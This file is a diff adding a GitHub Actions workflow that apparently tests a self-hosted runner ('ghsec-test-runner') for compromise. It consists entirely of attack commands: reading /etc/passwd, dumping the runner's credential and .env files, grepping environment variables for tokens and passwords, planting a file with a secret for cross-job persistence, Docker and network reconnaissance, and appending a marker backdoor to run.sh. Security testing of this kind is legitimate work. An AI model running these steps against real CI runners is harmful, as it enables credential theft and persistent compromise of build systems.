@@ -1,0 +1,146 @@
+name: Vector - Self-Hosted Runner Compromise
+on:
+  workflow_dispatch:
+
+jobs:
+  # ============================================================
+  # TEST 1: Host filesystem access
+  # ============================================================
+  host-filesystem-access:
+    runs-on: ghsec-test-runner
+    steps:
+      - name: Read host /etc/passwd
+        run: |
+          echo "=== /etc/passwd (first 10 lines) ==="
+          head -10 /etc/passwd
+          echo "--- Host filesystem IS accessible ---"
+      
+      - name: Check home directory contents
+        run: |
+          echo "=== Home directory ==="
+          ls -la ~/
+          echo "=== Current user ==="
+          whoami
+          id
+      
+      - name: Check sudo access
+        run: |
+          echo "=== Sudo check ==="
+          sudo -n whoami 2>/dev/null && echo "SUDO: YES" || echo "SUDO: NO (or needs password)"
+          groups
+
+  # ============================================================
+  # TEST 2: Runner credential theft
+  # ============================================================
+  runner-credential-theft:
+    runs-on: ghsec-test-runner
+    steps:
+      - name: Read runner config files
+        run: |
+          echo "=== Runner directory ==="
+          ls -la /tmp/ghsec-runner/
+          echo ""
+          echo "=== .runner file ==="
+          cat /tmp/ghsec-runner/.runner 2>/dev/null || echo "No .runner file"
+          echo ""
+          echo "=== .credentials file ==="
+          cat /tmp/ghsec-runner/.credentials 2>/dev/null || echo "No .credentials file"
+          echo ""
+          echo "=== .credentials_rsaparams ==="
+          cat /tmp/ghsec-runner/.credentials_rsaparams 2>/dev/null || echo "No .credentials_rsaparams file"
+          echo ""
+          echo "=== .env file ==="
+          cat /tmp/ghsec-runner/.env 2>/dev/null || echo "No .env file"
+
+  # ============================================================
+  # TEST 3: Cross-job persistence (poison next job)
+  # ============================================================
+  poison-runner:
+    runs-on: ghsec-test-runner
+    steps:
+      - name: Plant persistence file
+        run: |
+          echo "POISONED_BY_PREVIOUS_JOB=true" > /tmp/ghsec-runner/_work/.poison
+          echo "SECRET_LEAK=${{ secrets.FAKE_SECRET }}" >> /tmp/ghsec-runner/_work/.poison
+          echo "=== Poison file planted ==="
+          cat /tmp/ghsec-runner/_work/.poison
+
+  check-poison:
+    runs-on: ghsec-test-runner
+    needs: poison-runner
+    steps:
+      - name: Check for poison from previous job
+        run: |
+          echo "=== Checking for cross-job persistence ==="
+          if [ -f /tmp/ghsec-runner/_work/.poison ]; then
+            echo "POISON FOUND:"
+            cat /tmp/ghsec-runner/_work/.poison
+            echo "--- CROSS-JOB PERSISTENCE CONFIRMED ---"
+          else
+            echo "No poison found (runner may be ephemeral)"
+          fi
+
+  # ============================================================
+  # TEST 4: Docker socket access (container escape)
+  # ============================================================
+  docker-access:
+    runs-on: ghsec-test-runner
+    steps:
+      - name: Check Docker access
+        run: |
+          echo "=== Docker check ==="
+          docker --version 2>/dev/null || echo "Docker CLI not available"
+          docker ps 2>/dev/null && echo "DOCKER: Accessible" || echo "DOCKER: Not accessible"
+          ls -la /var/run/docker.sock 2>/dev/null || echo "No docker.sock"
+
+  # ============================================================
+  # TEST 5: Network reconnaissance
+  # ============================================================
+  network-recon:
+    runs-on: ghsec-test-runner
+    steps:
+      - name: Network scan
+        run: |
+          echo "=== Network interfaces ==="
+          ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "No network tools"
+          echo ""
+          echo "=== Routing table ==="
+          ip route 2>/dev/null || route 2>/dev/null || echo "No route info"
+          echo ""
+          echo "=== Listening ports ==="
+          ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo "No port scan tools"
+          echo ""
+          echo "=== /etc/hosts ==="
+          cat /etc/hosts
+
+  # ============================================================
+  # TEST 6: Secret exfiltration via runner filesystem
+  # ============================================================
+  secret-exfil:
+    runs-on: ghsec-test-runner
+    steps:
+      - name: Search for secrets in runner work directory
+        run: |
+          echo "=== Searching work directory for secret patterns ==="
+          find /tmp/ghsec-runner/_work -type f 2>/dev/null | head -20
+          echo ""
+          echo "=== Env vars containing 'SECRET' or 'TOKEN' ==="
+          env | grep -iE '(SECRET|TOKEN|KEY|PASSWORD)' || echo "No matching env vars"
+          echo ""
+          echo "=== .gitconfig ==="
+          cat ~/.gitconfig 2>/dev/null || echo "No .gitconfig"
+
+  # ============================================================
+  # TEST 7: Runner modification (backdoor)
+  # ============================================================
+  runner-modification:
+    runs-on: ghsec-test-runner
+    steps:
+      - name: Attempt to modify runner scripts
+        run: |
+          echo "=== Checking if we can modify runner ==="
+          ls -la /tmp/ghsec-runner/run.sh
+          echo "# BACKDOOR ADDED BY WORKFLOW" >> /tmp/ghsec-runner/run.sh
+          echo "=== Modified run.sh (last 3 lines) ==="
+          tail -3 /tmp/ghsec-runner/run.sh
+          echo "--- RUNNER MODIFICATION: POSSIBLE ---"
